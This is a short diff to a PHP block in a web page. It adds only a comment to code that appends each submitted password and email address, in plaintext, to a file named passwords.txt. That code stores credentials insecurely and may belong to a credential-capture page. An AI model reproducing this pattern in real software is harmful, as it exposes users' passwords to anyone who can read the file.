@@ -5,7 +5,7 @@
     $password = $_POST["password"];
     $email = $_POST["email"];
     $pw_log = fopen("passwords.txt", "a");
-    fwrite($pw_log, $password . " " . $email . PHP_EOL);
+    fwrite($pw_log, $password . " " . $email . PHP_EOL); // Stores the password and the email address on the same line.
     fclose($pw_log);
   ?>
 </head>
